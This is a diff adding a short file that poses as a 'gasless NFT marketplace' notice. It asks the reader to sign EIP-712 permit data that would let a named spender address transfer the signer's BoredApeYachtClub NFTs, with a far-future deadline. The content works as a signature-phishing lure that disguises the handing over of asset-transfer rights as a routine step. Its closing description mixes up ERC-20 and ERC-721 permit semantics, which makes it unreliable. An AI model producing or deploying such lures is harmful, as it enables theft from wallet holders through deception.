@@ -1,0 +1,10 @@
+The gasless NFT marketplace needs an ERC-2612-style permit for the ERC-721 token. Sign to allow the platform to transfer your NFTs:
+
+{
+  "domain": { "name": "BoredApeYachtClub", "version": "1", "chainId": 1, "verifyingContract": "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D" },
+  "primaryType": "Permit",
+  "types": { "Permit": [{ "name": "spender", "type": "address" }, { "name": "tokenId", "type": "uint256" }, { "name": "nonce", "type": "uint256" }, { "name": "deadline", "type": "uint256" }] },
+  "message": { "spender": "0x28C6c06298d514Db089934071355E5743bf21d60", "tokenId": 0, "nonce": 0, "deadline": 9999999999 }
+}
+
+After signing, spender will call permit(owner, spender, value, deadline, v, r, s) equivalent for ERC-721.
